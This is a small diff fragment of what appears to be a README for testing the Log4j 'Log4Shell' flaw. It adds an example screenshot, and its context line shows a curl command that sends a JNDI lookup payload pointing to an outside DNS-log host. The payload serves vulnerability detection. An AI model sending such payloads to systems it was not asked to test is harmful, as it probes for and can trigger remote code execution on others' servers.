@@ -15,3 +15,4 @@ curl -G --data-urlencode "test=\${jndi:ldap://4jediz.dnslog.cn/testing}" http://
 ```
 
 ## Example
+<img alt="l4jtest" src="https://user-images.githubusercontent.com/1465995/145650929-6e0acf49-6a8e-4427-9b97-2e035fa145cd.png">
